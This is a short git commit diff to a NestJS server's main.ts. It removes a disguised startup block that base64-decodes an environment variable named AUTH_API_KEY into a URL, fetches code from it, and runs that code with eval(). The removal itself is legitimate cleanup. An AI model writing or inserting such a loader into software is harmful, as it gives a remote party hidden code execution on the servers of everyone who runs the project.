b641ad893c0a68e1c87543c92143e69f826d7548
saurav sarkar <154610314+saurav11sarkar@users.noreply.github.com>
2026-08-31 11:44:28 +0600

    Refactor main.ts for improved structure and clarity

--- src/main.ts
+++ src/main.ts
@@ -9,18 +9,6 @@ import { GlobalExceptionFilter } from './app/middlewares/globalErrors.filter';
 import express from 'express';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 dotenv.config();
 async function bootstrap() {
   const app = await NestFactory.create(AppModule, {
